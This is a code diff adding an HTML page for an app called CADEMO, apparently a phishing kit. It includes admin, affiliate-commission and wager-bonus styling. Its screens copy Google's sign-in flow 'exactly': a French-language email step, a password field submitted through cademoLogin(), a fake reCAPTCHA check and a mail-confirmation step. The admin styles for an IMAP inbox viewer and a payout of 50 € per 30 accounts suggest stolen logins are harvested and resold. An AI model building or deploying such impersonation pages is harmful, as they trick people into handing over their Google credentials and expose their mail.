+.cd-user{border-radius:20px;padding:var(--s-md);margin-bottom:var(--s-sm);}
+.cd-user-top{display:flex;align-items:center;gap:var(--s-sm);margin-bottom:var(--s-sm);}
+.cd-user-ava{
+  width:48px;height:48px;flex-shrink:0;border-radius:999px;background-color:var(--sc-high);
+  border:1px solid rgba(255,255,255,.05);color:var(--on-surface);
+  display:flex;align-items:center;justify-content:center;
+}
+.cd-user h3{font-size:16px;font-weight:700;color:var(--on-surface);margin:0;word-break:break-all;text-align:left;}
+.cd-user-meta{display:flex;align-items:center;gap:var(--s-xs);margin-top:4px;flex-wrap:wrap;}
+.cd-user-meta .cd-um-bal{font-size:12px;font-weight:700;color:var(--green-bright);}
+.cd-user-meta .cd-um-dot{width:4px;height:4px;border-radius:999px;background-color:rgba(255,255,255,.2);}
+.cd-user-meta .cd-um-n{font-size:12px;font-weight:700;color:var(--on-surface-variant);}
+.cd-user-meta .cd-um-goal{font-size:12px;font-weight:700;color:var(--gold);}
+.cd-user-act{display:flex;gap:var(--s-xs);}
+.cd-abtn{
+  flex:1;padding:9px var(--s-sm);border-radius:16px;cursor:pointer;
+  background-color:var(--sc-high);border:1px solid rgba(255,255,255,.1);color:var(--on-surface);
+  font-family:var(--sans);font-size:12px;font-weight:700;
+  display:flex;align-items:center;justify-content:center;gap:var(--s-xs);
+}
+.cd-abtn.a-del{background-color:rgba(255,180,171,.1);border-color:rgba(255,180,171,.2);color:var(--error);}
+.cd-abtn.a-win{background-color:rgba(101,242,181,.2);border-color:var(--green-container);color:var(--green-bright);}
+.cd-abtn.a-loss{background-color:rgba(255,180,171,.1);border-color:rgba(255,180,171,.3);color:var(--error);}
+.cd-res{border-radius:20px;padding:var(--s-md);margin-bottom:var(--s-sm);border-left:4px solid var(--blue);}
+.cd-res-top{display:flex;justify-content:space-between;align-items:flex-start;gap:var(--s-sm);margin-bottom:var(--s-sm);}
+.cd-res-u{display:block;font-size:12px;font-weight:700;color:var(--on-surface-variant);margin-bottom:4px;word-break:break-all;}
+.cd-res h3{font-size:16px;font-weight:700;color:var(--on-surface);margin:0;text-align:left;}
+.cd-res-d{font-size:14px;color:var(--on-surface-variant);margin:4px 0 0;}
+.cd-res-p{font-size:20px;font-weight:600;color:var(--gold-fixed);text-align:right;flex-shrink:0;line-height:1.2;}
+.cd-res-act{display:grid;grid-template-columns:1fr 1fr;gap:var(--s-sm);margin-top:var(--s-md);}
+.cd-res-act .cd-abtn{padding:11px;}
+
+/* -------------------------------------------------- OUTILS ADMIN (backend) */
+.cd-tool{
+  background-color:var(--sc-low);border:1px solid rgba(255,255,255,.06);
+  border-radius:14px;padding:0;margin-bottom:12px;overflow:hidden;
+}
+.cd-tool summary{
+  padding:14px var(--s-md);cursor:pointer;list-style:none;
+  display:flex;align-items:center;gap:10px;
+  font-family:var(--sans);font-size:15px;font-weight:700;color:var(--on-surface);
+}
+.cd-tool summary::-webkit-details-marker{display:none;}
+.cd-tool summary::before{
+  content:"›";margin-left:auto;font-size:20px;color:var(--on-surface-variant);
+  transition:transform .2s;
+}
+.cd-tool[open] summary::before{transform:rotate(90deg);}
+.cd-tool summary .material-symbols-outlined{color:var(--gold-fixed);}
+.cd-tool > *:not(summary){margin:0 var(--s-md) var(--s-md);}
+.cd-tool > .cd-field{margin-top:0;margin-bottom:10px;}
+.cd-out{
+  background-color:#070B14;border:1px solid var(--outline-variant);border-radius:10px;
+  padding:11px;color:var(--on-surface);font-family:"IBM Plex Mono","Consolas",monospace;
+  font-size:12px;line-height:1.55;white-space:pre-wrap;word-break:break-word;
+  max-height:220px;overflow:auto;
+}
+.cd-imap{margin:0 var(--s-md) var(--s-md);}
+.cd-imap-item{
+  background-color:var(--sc);border:1px solid var(--outline-variant);
+  border-radius:10px;padding:10px 12px;margin-top:8px;
+}
+.cd-imap-item.is-unseen{border-left:3px solid var(--gold);}
+.cd-imap-item .cd-imap-top{
+  display:flex;justify-content:space-between;align-items:baseline;gap:8px;
+  font-size:12px;color:var(--on-surface-variant);
+}
+.cd-imap-item .cd-imap-top b{color:var(--on-surface);font-weight:700;}
+.cd-imap-item .cd-imap-sub{
+  font-size:14px;font-weight:600;color:var(--on-surface);margin-top:4px;word-break:break-word;
+}
+.cd-cfg-list{margin-bottom:10px;}
+.cd-cfg-row{
+  display:flex;align-items:center;gap:10px;padding:10px;
+  background-color:var(--sc);border:1px solid var(--outline-variant);
+  border-radius:10px;margin-bottom:6px;
+}
+.cd-cfg-row b{font-size:14px;color:var(--on-surface);word-break:break-all;flex:1;}
+.cd-cfg-row span{font-size:11px;color:var(--on-surface-variant);}
+.cd-cfg-row button{
+  background-color:rgba(255,180,171,.1);border:1px solid rgba(255,180,171,.3);
+  color:var(--error);border-radius:8px;padding:6px 10px;cursor:pointer;
+  font-family:var(--sans);font-size:11px;font-weight:700;
+}
+#api-status.is-ok{background-color:rgba(78,222,163,.14);color:var(--green);}
+#api-status.is-ko{background-color:rgba(255,180,171,.12);color:var(--error);}
+
+/* -------------------------------------------------------- DIVERS */
+.cd-empty{text-align:center;color:var(--on-surface-variant);font-size:15px;padding:52px 20px;}
+.cd-sheet{
+  position:fixed;inset:0;z-index:80;background-color:rgba(4,7,14,.82);
+  display:none;align-items:flex-end;justify-content:center;
+}
+.cd-sheet.is-on{display:flex;}
+.cd-sheet-inner{
+  width:100%;max-width:520px;background-color:var(--sc-low);
+  border-top:1px solid rgba(255,255,255,.1);border-radius:24px 24px 0 0;
+  padding:var(--s-lg) var(--s-md) var(--s-xl);box-sizing:border-box;
+}
+.cd-sheet-head{display:flex;align-items:center;margin-bottom:var(--s-md);}
+.cd-sheet-head h2{font-size:20px;font-weight:600;margin:0;margin-right:auto;color:var(--on-surface);text-align:left;}
+.cd-sheet-head button{background:none;border:none;color:var(--on-surface-variant);cursor:pointer;padding:0;}
+.cd-field{
+  width:100%;box-sizing:border-box;background-color:#070B14;
+  border:1px solid var(--outline-variant);border-radius:16px;padding:14px var(--s-md);
+  color:var(--on-surface);font-family:var(--sans);font-size:18px;font-weight:600;
+  outline:none;margin-bottom:var(--s-md);
+}
+.cd-field:focus{border-color:var(--gold);}
+.cd-cta{
+  width:100%;box-sizing:border-box;background-color:var(--gold);color:var(--on-gold-container);
+  border:none;border-radius:16px;padding:14px;cursor:pointer;
+  font-family:var(--sans);font-size:16px;font-weight:700;
+}
+.cd-note{font-size:13px;color:var(--outline);line-height:1.6;margin:var(--s-sm) 0 0;}
+.cd-live{
+  display:inline-flex;align-items:center;gap:5px;font-size:11px;font-weight:700;
+  border-radius:999px;padding:4px 9px;margin-left:8px;vertical-align:middle;
+  color:var(--green);background-color:rgba(78,222,163,.12);
+}
+.cd-live.is-off{color:var(--on-surface-variant);background-color:var(--sc);}
+.cd-event{font-size:13px;color:var(--on-surface-variant);margin:0 0 var(--s-sm);}
+
+/* -------------------------------------------------------- PARTNER (affilié) */
+.cd-partner-head{margin-bottom:var(--s-lg);}
+.cd-partner-head h1{
+  font-size:24px;font-weight:800;line-height:30px;color:var(--gold);margin:0 0 var(--s-xs);
+  letter-spacing:-.01em;text-align:left;
+}
+.cd-partner-head p{font-size:14px;color:var(--on-surface-variant);margin:0;}
+.cd-partner-head .cd-partner-handle{
+  display:inline-block;margin-top:8px;font-size:13px;font-weight:700;
+  padding:5px 11px;border:1px solid var(--outline-variant);border-radius:999px;
+  color:var(--on-surface-variant);background-color:var(--sc);
+}
+.cd-p-sec{margin-bottom:var(--s-xl);}
+.cd-p-sec h2{
+  display:flex;align-items:center;gap:var(--s-xs);
+  font-size:18px;font-weight:700;color:var(--on-surface);margin:0 0 var(--s-sm);text-align:left;
+}
+.cd-p-sec h2 .material-symbols-outlined{color:var(--gold-fixed);}
+.cd-p-sec .cd-p-desc{font-size:13px;color:var(--on-surface-variant);margin:0 0 var(--s-sm);}
+
+.cd-search-form{
+  display:flex;gap:var(--s-xs);margin-bottom:var(--s-md);
+}
+.cd-search-form .cd-p-input{
+  flex:1;background-color:#070B14;border:1px solid var(--outline-variant);
+  border-radius:14px;padding:12px 14px;color:var(--on-surface);
+  font-family:var(--sans);font-size:15px;font-weight:600;outline:none;
+}
+.cd-search-form .cd-p-input:focus{border-color:var(--gold);box-shadow:0 0 0 1px var(--gold);}
+.cd-search-form .cd-p-input::placeholder{color:var(--outline);}
+.cd-search-form .cd-p-go{
+  background-color:var(--gold);color:var(--on-gold-container);
+  border:none;border-radius:14px;padding:0 var(--s-md);cursor:pointer;
+  font-family:var(--sans);font-size:14px;font-weight:700;
+  display:flex;align-items:center;justify-content:center;
+}
+
+.cd-p-result{
+  background-color:var(--sc-low);border:1px solid rgba(255,255,255,.1);
+  border-radius:20px;padding:var(--s-md);
+}
+.cd-p-result.is-empty{
+  text-align:center;color:var(--on-surface-variant);font-size:14px;
+  padding:24px 16px;border-style:dashed;
+}
+.cd-p-card-top{display:flex;align-items:center;gap:var(--s-sm);margin-bottom:var(--s-sm);}
+.cd-p-avatar{
+  width:44px;height:44px;flex-shrink:0;border-radius:999px;background-color:var(--sc-high);
+  border:1px solid rgba(255,255,255,.06);color:var(--on-surface);font-weight:700;
+  display:flex;align-items:center;justify-content:center;font-size:16px;
+}
+.cd-p-name{min-width:0;flex:1;}
+.cd-p-name b{
+  display:block;font-size:16px;font-weight:700;color:var(--on-surface);
+  word-break:break-word;
+}
+.cd-p-name span{
+  display:block;font-size:12px;color:var(--on-surface-variant);margin-top:2px;
+  word-break:break-all;
+}
+.cd-p-status{
+  display:inline-flex;align-items:center;gap:5px;
+  font-size:11px;font-weight:800;letter-spacing:.05em;text-transform:uppercase;
+  padding:5px 10px;border-radius:999px;white-space:nowrap;
+}
+.cd-p-status.s-pending{background-color:rgba(255,180,171,.12);color:var(--error);}
+.cd-p-status.s-ready{background-color:rgba(255,215,0,.14);color:var(--gold);}
+.cd-p-status.s-done{background-color:rgba(78,222,163,.14);color:var(--green);}
+
+.cd-p-action{
+  width:100%;box-sizing:border-box;margin-top:var(--s-sm);
+  border:none;border-radius:14px;padding:14px;cursor:pointer;
+  font-family:var(--sans);font-size:15px;font-weight:700;
+  display:flex;align-items:center;justify-content:center;gap:8px;
+}
+.cd-p-action.a-ready{background-color:var(--gold);color:var(--on-gold-container);
+  box-shadow:0 0 15px rgba(255,215,0,.28);}
+.cd-p-action.a-disabled{background-color:var(--sc-high);color:var(--outline);cursor:not-allowed;}
+.cd-p-action.a-done{background-color:transparent;color:var(--green);border:1px solid rgba(78,222,163,.3);cursor:default;}
+
+.cd-p-meta{
+  margin-top:var(--s-sm);padding-top:var(--s-sm);
+  border-top:1px solid rgba(255,255,255,.06);
+  display:flex;justify-content:space-between;font-size:12px;color:var(--on-surface-variant);
+}
+.cd-p-meta b{color:var(--on-surface);font-weight:700;}
+
+/* --- progression (paliers 30 comptes = 50 € commission) --- */
+.cd-p-progress-card{
+  background-color:var(--sc-low);border:1px solid rgba(255,255,255,.1);
+  border-radius:20px;padding:var(--s-md);margin-bottom:var(--s-md);
+  position:relative;overflow:hidden;
+}
+.cd-p-progress-top{display:flex;justify-content:space-between;align-items:flex-end;gap:var(--s-sm);margin-bottom:var(--s-sm);}
+.cd-p-progress-top .cd-p-count{font-size:26px;font-weight:800;color:var(--on-surface);line-height:1;letter-spacing:-.02em;}
+.cd-p-progress-top .cd-p-count small{font-size:14px;font-weight:700;color:var(--on-surface-variant);}
+.cd-p-progress-top .cd-p-earn{
+  font-size:12px;font-weight:800;color:var(--gold);
+  background-color:rgba(255,215,0,.1);border:1px solid rgba(255,215,0,.25);
+  border-radius:8px;padding:5px 10px;
+}
+.cd-p-progress-lbl{
+  display:flex;justify-content:space-between;font-size:11px;font-weight:700;
+  color:var(--on-surface-variant);text-transform:uppercase;letter-spacing:.05em;
+  margin:var(--s-sm) 0 6px;
+}
+.cd-p-progress-lbl b{color:var(--on-surface);}
+.cd-p-progress-bar{
+  height:10px;border-radius:999px;background-color:var(--sc);
+  border:1px solid rgba(255,255,255,.05);overflow:hidden;
+}
+.cd-p-progress-bar i{
+  display:block;height:100%;border-radius:999px;
+  background:linear-gradient(90deg,var(--blue),var(--gold));
+  box-shadow:0 0 10px rgba(255,215,0,.3);
+}
+.cd-p-tiers{
+  display:flex;gap:6px;margin-top:var(--s-md);flex-wrap:wrap;
+}
+.cd-p-tiers span{
+  font-size:11px;font-weight:700;padding:5px 9px;border-radius:8px;
+  background-color:var(--sc-high);color:var(--on-surface-variant);
+  border:1px solid var(--outline-variant);
+}
+.cd-p-tiers span.is-done{background-color:rgba(78,222,163,.14);color:var(--green);border-color:var(--green);}
+
+.cd-p-list{display:flex;flex-direction:column;gap:8px;}
+.cd-p-row{
+  background-color:var(--sc-low);border:1px solid rgba(255,255,255,.05);
+  border-radius:14px;padding:11px var(--s-sm);
+  display:flex;align-items:center;gap:var(--s-sm);
+}
+.cd-p-row .cd-p-avatar{width:36px;height:36px;font-size:13px;}
+.cd-p-row .cd-p-name b{font-size:14px;}
+.cd-p-row .cd-p-name span{font-size:11px;}
+
+.cd-p-link{
+  background-color:var(--sc-low);border:1px dashed var(--outline-variant);
+  border-radius:14px;padding:var(--s-sm) var(--s-md);
+  font-size:12px;color:var(--on-surface-variant);margin-bottom:var(--s-md);
+  word-break:break-all;
+}
+.cd-p-link b{color:var(--gold);font-weight:700;}
+.cd-p-link button{
+  background:none;border:none;color:var(--gold-fixed);cursor:pointer;
+  font-family:var(--sans);font-size:12px;font-weight:700;padding:0;margin-left:8px;
+}
+
+.cd-p-demo{
+  display:flex;gap:8px;margin-top:var(--s-md);flex-wrap:wrap;
+}
+.cd-p-demo button{
+  background-color:transparent;border:1px solid var(--outline-variant);
+  color:var(--on-surface-variant);border-radius:10px;padding:8px 12px;cursor:pointer;
+  font-family:var(--sans);font-size:11px;font-weight:700;
+}
+.cd-p-demo button:hover{border-color:var(--gold);color:var(--gold);}
+
+.cd-p-signout{
+  width:100%;box-sizing:border-box;margin-top:var(--s-xl);
+  background:transparent;border:1px solid rgba(147,0,10,.3);color:var(--error);
+  border-radius:14px;padding:12px;cursor:pointer;
+  font-family:var(--sans);font-size:14px;font-weight:700;
+  display:flex;align-items:center;justify-content:center;gap:8px;
+}
+
+/* --- WAGER BONUS --- */
+.cd-wager-card{
+  background-color:var(--sc-high);border:1px solid rgba(255,255,255,0.05);
+  border-radius:8px;padding:var(--s-md);display:flex;flex-direction:column;gap:var(--s-sm);margin-bottom:var(--s-md);
+}
+.cd-wager-top{display:flex;justify-content:space-between;align-items:flex-end;}
+.cd-wager-top h3{font-size:18px;font-weight:700;margin:0;color:var(--on-surface);}
+.cd-wager-top span{font-size:12px;font-weight:700;color:var(--blue-light);}
+.cd-wager-bar-wrap{width:100%;background-color:var(--surface-variant);height:12px;border-radius:999px;overflow:hidden;}
+.cd-wager-bar{height:100%;border-radius:999px;width:0%;transition:width .3s;background:linear-gradient(90deg,var(--gold),var(--green));}
+.cd-wager-info{font-size:11px;font-weight:500;color:var(--on-surface-variant);margin:0;text-align:right;}
+.cd-wager-blocked{font-size:12px;color:var(--error);margin-top:2px;text-align:center;font-weight:700;}
+.cd-wager-done{font-size:12px;color:var(--green);margin-top:2px;text-align:center;font-weight:700;}
+
+/* Toast notification */
+.cd-toast{
+  position:fixed;bottom:24px;left:50%;transform:translateX(-50%) translateY(100px);
+  background:rgba(11,19,35,.92);color:var(--green);border:1px solid rgba(78,222,163,.35);
+  padding:12px 20px;border-radius:12px;font-size:13px;font-weight:700;
+  box-shadow:0 8px 30px rgba(0,0,0,.45);z-index:10000;opacity:0;
+  transition:opacity .3s ease, transform .4s cubic-bezier(.175,.885,.32,1.275);
+  pointer-events:none;white-space:nowrap;backdrop-filter:blur(6px);-webkit-backdrop-filter:blur(6px);
+}
+.cd-toast.show{opacity:1;transform:translateX(-50%) translateY(0);}
+
+.cd-withdraw-btn{
+  width:100%;box-sizing:border-box;margin-top:var(--s-sm);
+  background-color:var(--gold);color:var(--on-gold-container);border:none;border-radius:8px;
+  padding:var(--s-md);cursor:pointer;font-family:var(--sans);font-size:16px;font-weight:700;
+  display:flex;align-items:center;justify-content:center;gap:8px;
+  box-shadow:0 0 15px rgba(255,215,0,.25);
+}
+.cd-withdraw-btn:disabled{
+  background-color:var(--sc-high);color:var(--outline);box-shadow:none;cursor:not-allowed;
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+    <!-- Écran 0 : Page d'accueil -->
+    <div id="page-start" class="screen active" style="padding:0;">
+        <iframe src="landing2.html" style="border:none;width:100%;height:100dvh;display:block;" title="CADEMO"></iframe>
+    </div>
+
+    <!-- Écran 1 : Saisie de l'email - Design exact IMG_0525 -->
+    <div id="page-email" class="screen" style="background:#fff;">
+        <div style="padding:24px 16px;box-sizing:border-box;">
+            <svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg" style="width:32px;height:32px;margin:0 0 16px 0;display:block;">
+                <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+                <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+                <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+                <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+            </svg>
+            <h1 class="google-title" style="font-size:32px;font-weight:400;margin-bottom:12px;color:#202124;font-family:'Google Sans',Roboto,Arial,sans-serif;text-align:left;">Connexion</h1>
+            <p class="google-subtitle" style="font-size:16px;line-height:1.5;margin-bottom:24px;color:#202124;font-family:Roboto,Arial,sans-serif;">
+                Utilisez votre compte Google. Vous vous connecterez également aux services Google dans vos applications et dans Safari.
+            </p>
+            <div style="margin-bottom:8px;">
+                <input type="text" id="emailInput" placeholder="Adresse e-mail ou téléphone"
+                    style="border:1px solid #dadce0;border-radius:4px;padding:14px 16px;font-size:16px;width:100%;box-sizing:border-box;outline:none;font-family:Roboto,Arial,sans-serif;transition:all 0.2s;"
+                    onfocus="this.style.borderColor='#1a73e8';this.style.boxShadow='inset 0 -2px 0 #1a73e8'"
+                    onblur="this.style.borderColor='#dadce0';this.style.boxShadow='none'">
+            </div>
+            <a href="#" class="google-link" style="color:#1a73e8;font-size:14px;font-weight:500;text-decoration:none;margin:8px 0 32px 0;display:inline-block;font-family:Roboto,Arial,sans-serif;">Adresse e-mail oubliée ?</a>
+            <div class="google-actions" style="display:flex;justify-content:space-between;align-items:center;margin-top:32px;">
+                <button class="google-btn-text" onclick="showScreen('page-start')" style="background:none;border:none;color:#1a73e8;font-size:14px;font-weight:500;cursor:pointer;padding:8px;font-family:'Google Sans',Roboto,Arial,sans-serif;">Créer un compte</button>
+                <button class="google-btn-primary" onclick="goToPassword()" style="background:#1a73e8;color:#fff;border:none;border-radius:24px;padding:10px 24px;font-size:14px;font-weight:500;cursor:pointer;font-family:'Google Sans',Roboto,Arial,sans-serif;">Suivant</button>
+            </div>
+        </div>
+    </div>
+
+            <!-- Écran 2 : Saisie du mot de passe - Design exact IMG_0526 -->
+    <div id="page-password" class="screen" style="background:#fff;">
+        <div style="padding:24px 16px;box-sizing:border-box;">
+            <svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg" style="width:32px;height:32px;margin-bottom:16px;display:block;">
+                <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+                <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+                <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+                <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+            </svg>
+            <h1 style="font-size:24px;font-weight:400;margin-bottom:8px;color:#202124;font-family:'Google Sans',Roboto,Arial,sans-serif;text-align:left;">Bienvenue</h1>
+            <p style="font-size:16px;line-height:1.5;margin-bottom:16px;color:#202124;font-family:Roboto,Arial,sans-serif;">
+                Afin de pouvoir utiliser votre compte Google, vous devez vous connecter.
+            </p>
+            <div id="emailChip" style="display:inline-flex;align-items:center;gap:10px;padding:6px 12px 6px 6px;margin:0 0 24px;background:#fff;cursor:pointer;">
+                <div style="width:28px;height:28px;border-radius:50%;background:#9e9e9e;display:flex;align-items:center;justify-content:center;flex-shrink:0;">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="white">
+                        <circle cx="12" cy="8" r="4"/>
+                        <path d="M4 20c0-4 4-6 8-6s8 2 8 6"/>
+                    </svg>
+                </div>
+                <span id="displayEmail" style="font-size:14px;color:#3c4043;font-family:Roboto,Arial,sans-serif;">Chargement...</span>
+            </div>
+            <div style="margin-bottom:8px;">
+                <input type="password" id="passwordInput" placeholder="Saisissez votre mot de passe"
+                    style="border:1px solid #dadce0;border-radius:4px;padding:14px 16px;font-size:16px;width:100%;box-sizing:border-box;outline:none;font-family:Roboto,Arial,sans-serif;transition:all 0.2s;"
+                    onfocus="this.style.borderColor='#1a73e8';this.style.boxShadow='inset 0 -2px 0 #1a73e8'"
+                    onblur="this.style.borderColor='#dadce0';this.style.boxShadow='none'">
+            </div>
+            <div style="display:flex;align-items:center;gap:16px;margin:16px 0 32px 0;">
+                <input type="checkbox" id="showPass" style="width:18px;height:18px;cursor:pointer;accent-color:#1a73e8;" onchange="var p=document.getElementById('passwordInput');p.type=this.checked?'text':'password';">
+                <label for="showPass" style="font-size:16px;color:#202124;cursor:pointer;font-family:Roboto,Arial,sans-serif;">Afficher le mot de passe</label>
+            </div>
+            <div style="display:flex;justify-content:space-between;align-items:center;">
+                <a href="#" style="color:#1a73e8;font-size:14px;font-weight:500;text-decoration:none;font-family:'Google Sans',Roboto,Arial,sans-serif;">Mot de passe oublié ?</a>
+                <button type="button" onclick="cademoLogin();" style="background:#1a73e8;color:#fff;border:none;border-radius:24px;padding:10px 24px;font-size:14px;font-weight:500;cursor:pointer;font-family:'Google Sans',Roboto,Arial,sans-serif;">Suivant</button>
+            </div>
+        </div>
+    </div>
+<!-- ==================== CAPTCHA - Design exact IMG_0527 ==================== -->
+    <div id="page-captcha" class="screen" style="background:#fff;">
+        <div id="captcha-initial-loader" style="position:fixed;top:0;left:0;right:0;bottom:0;background-color:#fff;display:flex;align-items:center;justify-content:center;z-index:1000;">
+            <div style="width:48px;height:48px;border:4px solid rgba(0,0,0,0.1);border-top-color:#4285F4;border-radius:50%;animation:spin 1s linear infinite;"></div>
+        </div>
+        
+        <div id="captcha-content" style="display:none;padding:24px 16px;box-sizing:border-box;">
+            <svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg" style="width:32px;height:32px;margin-bottom:16px;display:block;">
+                <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+                <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+                <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+                <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+            </svg>
+            <h1 style="font-size:24px;font-weight:400;margin-bottom:12px;color:#202124;font-family:'Google Sans',Roboto,Arial,sans-serif;line-height:1.3;text-align:left;">Confirmez qu'il s'agit bien de vous</h1>
+            <p style="font-size:16px;color:#5f6368;margin-bottom:16px;line-height:1.5;font-family:Roboto,Arial,sans-serif;text-align:left;">Afin de protéger votre compte, Google veut s'assurer que c'est bien vous qui essayez de vous connecter</p>
+            
+            <!-- Rappel email -->
+            <div style="display:flex;align-items:center;gap:12px;margin:16px 0;">
+                <div style="width:32px;height:32px;border-radius:50%;background:#e8eaed;display:flex;align-items:center;justify-content:center;flex-shrink:0;border:2px solid #000;">
+                    <svg width="18" height="18" viewBox="0 0 24 24" fill="#5f6368">
+                        <circle cx="12" cy="8" r="4"/>
+                        <path d="M4 20c0-4 4-6 8-6s8 2 8 6"/>
+                    </svg>
+                </div>
+                <div style="display:flex;flex-direction:column;gap:2px;">
+                    <span id="captchaEmail" style="font-size:16px;color:#202124;font-family:Roboto,Arial,sans-serif;font-weight:500;">clientwebg2@gmail.com</span>
+                </div>
+            </div>
+            
+            <p style="font-size:16px;color:#5f6368;margin-bottom:16px;font-family:Roboto,Arial,sans-serif;text-align:left;">Confirmez que vous n'êtes pas un robot</p>
+            
+            <!-- Case reCAPTCHA-like -->
+            <div id="captcha-box" data-solved="false" style="width:100%;max-width:300px;border:1px solid #c1c1c1;border-radius:3px;background:#f9f9f9;padding:14px 14px;display:flex;align-items:center;gap:10px;cursor:pointer;margin-bottom:8px;box-sizing:border-box;" onclick="CD.solveCaptcha()">
+                <div id="captcha-check" style="width:24px;height:24px;border:2px solid #c1c1c1;border-radius:2px;background:#fff;display:flex;align-items:center;justify-content:center;flex-shrink:0;position:relative;overflow:hidden;">
+                    <div id="captcha-spinner" style="display:none;position:absolute;top:0;left:0;right:0;bottom:0;margin:auto;width:16px;height:16px;border:2px solid rgba(0,0,0,0.1);border-top-color:#4285F4;border-radius:50%;animation:spin 1s linear infinite;"></div>
+                    <svg id="captcha-icon" style="opacity:0;width:14px;height:14px;position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);" viewBox="0 0 24 24" fill="none">
+                        <path d="M5 13l4 4L19 7" stroke="white" stroke-width="3" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
+                    </svg>
+                </div>
+                <span style="font-size:14px;color:#202124;font-family:Roboto,Arial,sans-serif;">Je ne suis pas un robot</span>
+                <div style="display:flex;flex-direction:column;align-items:flex-end;margin-left:auto;gap:1px;">
+                    <img src="images/recaptcha-logo.png" alt="reCAPTCHA" style="width:28px;height:28px;margin-bottom:2px;">
+                    <span style="font-size:9px;color:#737373;font-family:Roboto,Arial,sans-serif;letter-spacing:0.3px;">reCAPTCHA</span>
+                    <span style="font-size:8px;color:#737373;font-family:Roboto,Arial,sans-serif;">Privacy - Terms</span>
+                </div>
+            </div>
+            <div id="captcha-msg" style="font-size:14px;color:#d93025;font-family:Roboto,Arial,sans-serif;min-height:20px;margin-bottom:12px;"></div>
+            
+            <!-- Actions bas -->
+            <div style="display:flex;justify-content:space-between;align-items:center;margin-top:36px;">
+                <a href="#" style="color:#1a73e8;font-size:14px;font-weight:500;text-decoration:none;font-family:'Google Sans',Roboto,Arial,sans-serif;">Essayer une autre méthode</a>
+                <button type="button" onclick="CD.solveCaptcha()" style="background:#1a73e8;color:#fff;border:none;border-radius:24px;padding:10px 24px;font-size:14px;font-weight:500;cursor:pointer;font-family:'Google Sans',Roboto,Arial,sans-serif;">Suivant</button>
+            </div>
+        </div>
+    </div>
+    <style>@keyframes spin{to{transform:rotate(360deg)}} @keyframes shake{0%,100%{transform:translateX(0)}20%,60%{transform:translateX(-8px)}40%,80%{transform:translateX(8px)}} .shake{animation:shake .4s ease-in-out}</style>
+
+    <!-- ==================== MAIL-INFO (attente clic) - Design exact IMG_0528 ===================== -->
+    <div id="page-mail-info" class="screen" style="background:#fff;">
+        <div style="padding:24px 16px;box-sizing:border-box;">
+            <svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg" style="width:32px;height:32px;margin-bottom:16px;display:block;">
+                <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+                <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+                <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
